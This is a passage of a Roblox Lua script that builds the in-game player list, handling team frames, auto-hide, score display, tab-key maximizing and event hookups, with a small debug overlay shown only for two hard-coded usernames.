	function TeamScoreChanged(entry,nscore)
		WaitForChild(entry['Frame'],'PlayerScore').Text = tostring(nscore)
		entry['TeamScore'] = nscore
	end
--[[
	called when child added to a team, used for autohide functionality
	Note: still has teamscore, consiter removing
--]]
	function TeamChildAdded(entry,nchild)
		if nchild.Name == 'AutoHide' then
			entry['AutoHide'] = true
		elseif nchild.Name == 'TeamScore' then
			WaitForChild(entry['Frame'],'PlayerScore').Text = tostring(nchild.Value)
			entry['TeamScore'] = nchild.Value
			nchild.Changed:connect(function() TeamScoreChanged(entry,nchild.Value) end)
		end
	end
--[[
	called when child added to a team, used for autohide functionality
	Note: still has teamscore, consiter removing
--]]
	function TeamChildRemoved(entry,nchild)
		if nchild.Name == 'AutoHide' then
			entry['AutoHide'] = false
		elseif nchild.Name == 'TeamScore' then
			WaitForChild(entry['Frame'],'PlayerScore').Text = ""
			entry['TeamScore'] = nil
		end
	end

	function TeamChanged(entry, property)
		if property=='Name' then
			WaitForChild(WaitForChild(entry['Frame'],'TitleFrame'),'Title').Text = entry['MyTeam'].Name

		elseif property=='TeamColor' then
			entry['Frame'].ClickListener.BackgroundColor3 = entry['MyTeam'].TeamColor.Color

			for _,i in pairs(TeamFrames) do
				if i['MyTeam'].TeamColor == entry['MyTeam'] then
					RemoveTeamFrame(entry['MyTeam'])	--NO DUPLICATE TEAMS!
				end
			end

			entry['MyPlayers']={}

			for _,i in pairs(PlayerFrames) do
				SetPlayerToTeam(i) 
			end
			BaseUpdate()
		end
	end

--[[
	creates team entry and frame for this team, sets up listeners for this team
	adds any players intended for this team,Creates neutral team if this is the first team added
	Note:might be best to break this into multiple functions to simplify
	@Args:
	nteam	new team object added
--]]
	function InsertTeamFrame(nteam) 
		while AddingFrameLock do debugprint('in adding team frame lock') wait(1/30) end 
		AddingFrameLock = true
		--for _,i in pairs(TeamFrames) do
		local nentry = {}
		nentry['MyTeam'] = nteam
		nentry['MyPlayers'] = {}
		nentry['Frame'] = MiddleTemplate:Clone()
		WaitForChild(WaitForChild(nentry['Frame'],'TitleFrame'),'Title').Text = nteam.Name
		nentry['Frame'].TitleFrame.Title.Font = 'ArialBold'
		nentry['Frame'].TitleFrame.Title.FontSize = 'Size18'
		nentry['Frame'].TitleFrame.Position=UDim2.new(nentry['Frame'].TitleFrame.Position.X.Scale,nentry['Frame'].TitleFrame.Position.X.Offset,.1,0)
		nentry['Frame'].TitleFrame.Size=UDim2.new(nentry['Frame'].TitleFrame.Size.X.Scale,nentry['Frame'].TitleFrame.Size.X.Offset,.8,0)
		nentry['Frame'].Position = UDim2.new(1,0,((#MiddleFrames) * nentry['Frame'].Size.Y.Scale),0)
		WaitForChild(nentry['Frame'],'ClickListener').MouseButton1Down:connect(function(nx,ny) StartDrag(nentry,nx,ny) end)
		nentry['Frame'].ClickListener.BackgroundColor3 = nteam.TeamColor.Color
		nentry['Frame'].ClickListener.BackgroundTransparency = .7
		nentry['Frame'].ClickListener.AutoButtonColor=false
		AddId = AddId + 1
		nentry['ID'] = AddId
		nentry['AutoHide'] = false
		if nteam:FindFirstChild('AutoHide') then
			nentry['AutoHide'] = true
		end
		if nteam:FindFirstChild('TeamScore') then
			TeamChildAdded(nentry,nteam.TeamScore)

		end

		nteam.ChildAdded:connect(function(nchild) TeamChildAdded(nentry,nchild) end)
		nteam.ChildRemoved:connect(function(nchild) TeamChildRemoved(nentry,nchild) end)
		nteam.Changed:connect(function(prop) TeamChanged(nentry,prop) end)

		for _,i in pairs(PlayerFrames) do
			if not i['Player'].Neutral and i['Player'].TeamColor == nteam.TeamColor then 
				AddPlayerToTeam(nentry,i) 
			end
		end
		nentry['IsHidden'] = false
		if not nentry['AutoHide'] or #nentry['MyPlayers'] > 0 then

			nentry['Frame'].Parent = ListFrame
			nentry['Frame']:TweenPosition(UDim2.new(.5,0,((#MiddleFrames) * nentry['Frame'].Size.Y.Scale),0), "Out", "Linear", BASE_TWEEN,true)
			AddMiddleBGFrame()
		else
			nentry['IsHidden'] = true
			nentry['Frame'].Parent = nil
		end

		table.insert(TeamFrames,nentry)
		UpdateMinimize()
		BaseUpdate()
		if #TeamFrames == 1 and not NeutralTeam then
			AddNeutralTeam()
		end
		AddingFrameLock = false
	end
--[[
	removes team from team list
	@Args:
	nteam		Teamobject to remove
--]]
	function RemoveTeamFrame(nteam)
		while AddingFrameLock do debugprint('in removing team frame lock') wait(1/30) end 
		AddingFrameLock = true
		if IsMinimized.Value then
		end
		local myEntry
		for i,key in ipairs(TeamFrames) do
			if nteam == key['MyTeam'] then
				myEntry = key
				key['Frame']:Destroy()
				table.remove(TeamFrames,i)
			end
		end
		if #TeamFrames==0 then
			debugprint('removeteamframe, remove neutral')
			if NeutralTeam then 
				RemoveNeutralTeam()
			end
		end
		for i,key in ipairs(myEntry['MyPlayers']) do
			RemovePlayerFromTeam(myEntry,i) 
			PlayerChanged(key, 'TeamColor')
		end
		RemoveMiddleBGFrame()
		BaseUpdate()
		AddingFrameLock = false
	end

	function TeamAdded(nteam)
		InsertTeamFrame(nteam)
	end

	function TeamRemoved(nteam)
		RemoveTeamFrame(nteam)
	end
	--------------------------------- 
--[[
	called when ANYTHING changes the state of the playerlist
	re-sorts everything,assures correct positions of all elements
--]]
	function BaseUpdate()
		while BaseUpdateLock do debugprint('in baseupdate lock') wait(1/30) end
		BaseUpdateLock = true
		--print ('baseupdate')
		UpdateStatNames()

		if #TeamFrames == 0 and not NeutralTeam then
			PlayerListModeUpdate()
		else
			TeamListModeUpdate()
		end
		for i,key in ipairs(MiddleFrames) do
			if key.Parent ~= nil then
				key:TweenPosition(UDim2.new(.5,0,((#MiddleFrames - (i)) * key.Size.Y.Scale),0), "Out", "Linear", BASE_TWEEN,true)
			end
		end
		if not IsMinimized.Value and #MiddleFrames>DefaultEntriesOnScreen then
			UpdateScrollPosition()
		end

		UpdateMinimize()

		UpdateScrollBarSize()
		UpdateScrollPosition()

		UpdateScrollBarVisibility()
		--debugprint('EndBaseUpdate')
		BaseUpdateLock = false
	end

--[[
	code for attaching tab key to maximizing player list
--]]
	--game.GuiService:AddKey("\t")
	local LastTabTime = time()
	Mouse.KeyDown:connect(
		function(key)
			if key == "\t" then
				debugprint('caught tab key')
				local modalCheck, isModal = pcall(function() return game.GuiService.IsModalDialog end)
				if modalCheck == false or (modalCheck and isModal == false) then
					if time() - LastTabTime > 0.4 then
						LastTabTime = time()
						if IsTabified.Value then
							if not IsMaximized.Value then
								ScreenGui:TweenPosition(UDim2.new(0, 0, 0,0),'Out','Linear',BASE_TWEEN*1.2,true)
								IsMaximized.Value = true
							else
								ScreenGui:TweenPosition(UDim2.new(NormalBounds.X.Scale, NormalBounds.X.Offset-10, 0,0),'Out','Linear',BASE_TWEEN*1.2,true)
								IsMaximized.Value = false
								IsMinimized.Value=true
							end
						else
							ToggleMaximize()
						end

					end
				end
			end
		end)


	function PlayersChildAdded(tplayer)
		if tplayer:IsA('Player') then 
			Spawn(function() debugPlayerAdd(tplayer) end) 
		else
			BlowThisPopsicleStand()
		end
	end

	function coreGuiChanged(coreGuiType, enabled)
		--	if coreGuiType == Enum.CoreGuiType.All or coreGuiType == Enum.CoreGuiType.PlayerList then
		--		MainFrame.Visible = enabled
		--	end
	end

	function TeamsChildAdded(nteam)
		if nteam:IsA('Team') then 
			TeamAdded(nteam)
		else
			BlowThisPopsicleStand() 
		end
	end

	function TeamsChildRemoved(nteam)
		if nteam:IsA('Team')  then 
			TeamRemoved(nteam) 
		else
			BlowThisPopsicleStand() 
		end
	end

	----------------------------  
	-- Hookups and initialization
	----------------------------  
	function debugPlayerAdd(p)
		InsertPlayerFrame(p)
	end

	pcall(function()
		coreGuiChanged(Enum.CoreGuiType.PlayerList, game.StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.PlayerList))
		game.StarterGui.CoreGuiChangedSignal:connect(coreGuiChanged)
	end)

	while not game:GetService('Teams') do wait(1/30) debugprint('Waiting For Teams') end
	for _,i in pairs(game.Teams:GetTeams()) do TeamAdded(i) end
	for _,i in pairs(Players:GetPlayers()) do Spawn(function() debugPlayerAdd(i) end) end

	game.Teams.ChildAdded:connect(TeamsChildAdded)
	game.Teams.ChildRemoved:connect(TeamsChildRemoved)
	Players.ChildAdded:connect(PlayersChildAdded)

	InitReportAbuse()
	AreNamesExpanded.Value = true
	BaseUpdate()



	--UGGGLY,find a better way later
	wait(2)
	IsPersonalServer= not not game.Workspace:FindFirstChild("PSVariable")

	----------------------------  
	-- Running Logic
	---------------------------- 

	--debug stuffs, will only run for 'newplayerlistisbad'
	if LocalPlayer.Name == 'newplayerlistisbad' or LocalPlayer.Name == 'imtotallyadmin' then
		debugFrame.Parent = ScreenGui
		Spawn(function()
			while true do
				local str_players=''
				for _,i in pairs(game.Players:GetPlayers()) do
					str_players= str_players .." " .. i.Name
				end
				debugplayers.Text=str_players
				wait(.5)
			end
		end)
	end


end
makegui()
game:GetService("CoreGui"):WaitForChild("ThemeProvider"):WaitForChild("TopBarFrame"):WaitForChild("RightFrame"):Destroy()
